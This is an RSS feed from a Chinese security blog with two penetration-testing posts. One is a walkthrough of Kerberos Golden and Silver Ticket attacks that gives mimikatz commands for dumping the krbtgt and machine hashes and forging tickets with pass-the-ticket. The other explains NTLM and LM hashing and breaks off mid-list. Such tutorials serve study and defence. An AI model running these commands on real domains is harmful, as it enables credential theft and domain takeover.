<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>域渗透 on iceH&#39;s Blog</title>
        <link>https://360rce.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/</link>
        <description>Recent content in 域渗透 on iceH&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！</copyright>
        <lastBuildDate>Wed, 25 Nov 2020 11:42:55 +0000</lastBuildDate><atom:link href="https://360rce.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Kerberos协议之黄金票据和白银票据</title>
        <link>https://360rce.github.io/p/denbk947/</link>
        <pubDate>Wed, 25 Nov 2020 11:42:55 +0000</pubDate>
        
        <guid>https://360rce.github.io/p/denbk947/</guid>
        <description>&lt;img src="https://w.wallhaven.cc/full/jx/wallhaven-jxdw35.png" alt="Featured image of post Kerberos协议之黄金票据和白银票据" /&gt;&lt;h2 id=&#34;golden-ticket黄金票据&#34;&gt;Golden Ticket(黄金票据)&lt;/h2&gt;
&lt;p&gt;在AS_REQ &amp;amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。&lt;/p&gt;
&lt;p&gt;那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门&lt;/p&gt;
&lt;h3 id=&#34;制作黄金票据的前提条件&#34;&gt;制作黄金票据的前提条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1、krbtgt用户的hash(就意味着你已经有域控制器权限了)    cbcede6976ded273667a8e574a17092f&lt;/li&gt;
&lt;li&gt;2、域名称    secice.cn&lt;/li&gt;
&lt;li&gt;3、域的SID值    S-1-5-21-1431134449-3516206009-3475222595&lt;/li&gt;
&lt;li&gt;4、要伪造的用户名(可以是任意用户甚至是不存在的用户)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;黄金票据利用&#34;&gt;黄金票据利用&lt;/h3&gt;
&lt;p&gt;先登录域控制器，dump krbtgt用户的hash值,获取域sid：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz # lsadump::dcsync /domain:secice.cn /user:krbtgt	//导出 krbtgt 密码 hash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;也可以
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe &amp;#34;lsadump::dcsync /domain:secice.cn /user:krbtgt&amp;#34; exit &amp;gt;&amp;gt; 1.txt	//将导出的信息保存在1.txt中
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/denbk947/01.png&#34;
	width=&#34;766&#34;
	height=&#34;669&#34;
	srcset=&#34;https://360rce.github.io/p/denbk947/01_huf011f00fc2b7bd404fa69b50cac55c7a_21639_480x0_resize_box_3.png 480w, https://360rce.github.io/p/denbk947/01_huf011f00fc2b7bd404fa69b50cac55c7a_21639_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;黄金票据利用&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;114&#34;
		data-flex-basis=&#34;274px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;切换到普通域用户的机器，生成TGT凭证,用户名随意:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz # kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;也可以
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe &amp;#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&amp;#34; &amp;#34;kerberos::list&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/denbk947/02.png&#34;
	width=&#34;1561&#34;
	height=&#34;707&#34;
	srcset=&#34;https://360rce.github.io/p/denbk947/02_hu68ae437a2363f02592c36f99c4b7e03f_30272_480x0_resize_box_3.png 480w, https://360rce.github.io/p/denbk947/02_hu68ae437a2363f02592c36f99c4b7e03f_30272_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;黄金票据利用&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;220&#34;
		data-flex-basis=&#34;529px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;silver-ticket白银票据&#34;&gt;Silver Ticket(白银票据)&lt;/h2&gt;
&lt;p&gt;白银票据是出现在TGS_REQ &amp;amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。&lt;/p&gt;
&lt;h3 id=&#34;伪造白银票据的前提条件&#34;&gt;伪造白银票据的前提条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1、域名称        secice.cn&lt;/li&gt;
&lt;li&gt;2、域的 SID    S-1-5-21-1431134449-3516206009-3475222595&lt;/li&gt;
&lt;li&gt;3、域的服务账号的密码 hash    f4bf5c36403ccc692e0bc5cf7f82a72a&lt;/li&gt;
&lt;li&gt;4、伪造的用户名(可以是任意的)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.&lt;/p&gt;
&lt;h3 id=&#34;白银票据利用&#34;&gt;白银票据利用&lt;/h3&gt;
&lt;p&gt;首先登录域控，dump机器hash&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;privilege::debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::logonpasswords
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;也可以
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit &amp;gt;&amp;gt; 1.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/denbk947/03.png&#34;
	width=&#34;767&#34;
	height=&#34;698&#34;
	srcset=&#34;https://360rce.github.io/p/denbk947/03_hu340416e9a86918f7174279f74051a03c_19311_480x0_resize_box_3.png 480w, https://360rce.github.io/p/denbk947/03_hu340416e9a86918f7174279f74051a03c_19311_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;白银票据利用&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;109&#34;
		data-flex-basis=&#34;263px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe privilege::debug &amp;#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/denbk947/04.png&#34;
	width=&#34;1791&#34;
	height=&#34;461&#34;
	srcset=&#34;https://360rce.github.io/p/denbk947/04_hub5208412b635e69992b978e76b923c23_21446_480x0_resize_box_3.png 480w, https://360rce.github.io/p/denbk947/04_hub5208412b635e69992b978e76b923c23_21446_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;白银票据利用&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;388&#34;
		data-flex-basis=&#34;932px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/denbk947/05.png&#34;
	width=&#34;481&#34;
	height=&#34;258&#34;
	srcset=&#34;https://360rce.github.io/p/denbk947/05_hu4c098ada5e2a9f9cb2e6350f30167ee4_7285_480x0_resize_box_3.png 480w, https://360rce.github.io/p/denbk947/05_hu4c098ada5e2a9f9cb2e6350f30167ee4_7285_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;白银票据利用&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;不仅仅是cifs服务还有其他：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/denbk947/06.png&#34;
	width=&#34;767&#34;
	height=&#34;511&#34;
	srcset=&#34;https://360rce.github.io/p/denbk947/06_hu55f34af6afa11860a5fde95f437ee04f_29112_480x0_resize_box_3.png 480w, https://360rce.github.io/p/denbk947/06_hu55f34af6afa11860a5fde95f437ee04f_29112_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;白银票据利用&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;150&#34;
		data-flex-basis=&#34;360px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ldap可以用来dcsync&lt;/p&gt;
&lt;h2 id=&#34;两者区别&#34;&gt;两者区别&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;访问权限不同
Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限
Silver Ticket: 伪造 TGS,只能访问指定的服务&lt;/li&gt;
&lt;li&gt;加密方式不同
Golden Ticket 由 krbtgt 的 Hash 加密
Silver Ticket 由服务账号(通常为计算机账户)Hash 加密&lt;/li&gt;
&lt;li&gt;认证流程不同
Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>彻底理解Windows认证</title>
        <link>https://360rce.github.io/p/mljrguh0/</link>
        <pubDate>Mon, 23 Nov 2020 11:42:55 +0000</pubDate>
        
        <guid>https://360rce.github.io/p/mljrguh0/</guid>
        <description>&lt;img src="https://w.wallhaven.cc/full/p9/wallhaven-p9goyp.png" alt="Featured image of post 彻底理解Windows认证" /&gt;&lt;h2 id=&#34;0x00-本地认证&#34;&gt;0x00 本地认证&lt;/h2&gt;
&lt;h3 id=&#34;本地认证基础知识&#34;&gt;本地认证基础知识&lt;/h3&gt;
&lt;p&gt;在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，但是操作系统中的密码存储在哪里呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;%SystemRoot%\system32\config\sam&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功!&lt;/p&gt;
&lt;p&gt;这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。&lt;/p&gt;
&lt;p&gt;上面认证的过程只是粗略的说法，整个认证过程并没有那么简单，从操作系统的角度来看，还是需要铺垫很多概念的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Windows本身不保存明文密码，只保留密码的Hash。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射pre-image）通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。 – Baidu&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为了保证存储的不是明文，从而采用Hash，但是密码Hash也需要特定的生成算法以及表现形式。&lt;/p&gt;
&lt;h3 id=&#34;ntlm-hash与ntlm&#34;&gt;NTLM Hash与NTLM&lt;/h3&gt;
&lt;p&gt;在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。&lt;/p&gt;
&lt;p&gt;这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。&lt;/p&gt;
&lt;p&gt;也就是说，NTLM与NTLM Hash相互对应。&lt;/p&gt;
&lt;p&gt;在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。&lt;/p&gt;
&lt;h3 id=&#34;ntlm-hash的产生&#34;&gt;NTLM Hash的产生&lt;/h3&gt;
&lt;p&gt;假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin -&amp;gt; hex(16进制编码) = 61646d696e
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;61646d696e -&amp;gt; Unicode = 610064006d0069006e00
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;610064006d0069006e00 -&amp;gt; MD4 = 209c6174da490caeb422f3fa5a7ae634
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;本地认证流程&#34;&gt;本地认证流程&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;winlogon.exe -&amp;gt; 接收用户输入 -&amp;gt; lsass.exe -&amp;gt; (认证)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。&lt;/li&gt;
&lt;li&gt;LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;lm-hash&#34;&gt;LM Hash&lt;/h3&gt;
&lt;p&gt;在NTLM协议问世之前，它对前身就是LM（LAN Manager）协议。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LM与NTLM协议的认证机制相同，但是加密算法不同。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。&lt;/p&gt;
&lt;p&gt;LM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;将所有小写字母转换为大写字母
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• &amp;gt;123ABC // 未达到7个字符
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• &amp;gt;31323341424300000000000000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• 将密码分割为两组7个字节的块
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• &amp;gt;31323341424300 00000000000000 // 16进制
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• 将每组转化为比特流，不足56Bit则在左边加0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• &amp;gt;31323341424300 -&amp;gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&amp;gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• 将比特流按照7比特一组，分出8组，末尾加0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;由于后者都为0，结果可想而知，那就都是0;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• -&amp;gt; 00110000100110001000110001101000000101000001001000001100 00000000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• -&amp;gt;30988C6814120C00 -&amp;gt; DES(30988C6814120C00) -&amp;gt; 48-D7-EB-91- 2F-5E-69-7C
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• 由于我们的密码不超过7字节，所以后面的一半是固定的:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• AA-D3-B4-35-B5-14-04-EE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• 连接两个DES加密字符串。这是LM哈希。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;• 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在上面的产生过程中，脆弱点就在于DES的Key（&lt;code&gt;KGS!@#$%&lt;/code&gt;）是固定的，也就是说，有了Key就能够解出原文。&lt;/p&gt;
&lt;p&gt;并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。&lt;/p&gt;
&lt;h2 id=&#34;0x01-网络认证&#34;&gt;0x01 网络认证&lt;/h2&gt;
&lt;p&gt;在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑 上的网络环境(工作区)，隶属于工作组的机器之间无法互相建 立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。&lt;/p&gt;
&lt;p&gt;假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。&lt;/p&gt;
&lt;p&gt;这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。&lt;/p&gt;
&lt;p&gt;早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。&lt;/p&gt;
&lt;h3 id=&#34;ntlm-协议&#34;&gt;NTLM 协议&lt;/h3&gt;
&lt;p&gt;NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这个协议只支持Windows&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;chalengeresponse&#34;&gt;Chalenge/Response&lt;/h3&gt;
&lt;p&gt;NTLM协议的认证过程分为三步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;协商&lt;/li&gt;
&lt;li&gt;质询&lt;/li&gt;
&lt;li&gt;验证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;协商&lt;/strong&gt;：主要用于确认双方协议版本&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;质询&lt;/strong&gt;：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的运作流程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;验证&lt;/strong&gt;：验证主要是在质询完成后，验证结果，是认证的最后一步。&lt;/p&gt;
&lt;p&gt;质询的完整过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.客户端向服务器端发送用户信息(用户名)请求&lt;/li&gt;
